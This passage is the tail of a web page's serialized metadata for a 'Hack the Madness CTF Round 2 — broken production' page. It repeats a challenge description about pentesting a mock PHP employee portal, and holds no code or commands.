weaknesses. Your goal is to get more privileges and command execution on the server.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"Hack the Madness CTF Round 2 — broken production\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"Hack the Madness CTF Round 2 — broken production\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"Our PHP devs are working on this employee management portal. We have a mock build of the website and you are to pentest the platform for weaknesses. Your goal is to get more privileges and command execution on the server.\"}]],\"error\":null,\"digest\":\"$undefined\"}\nc:{\"metadata\":\"$12:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>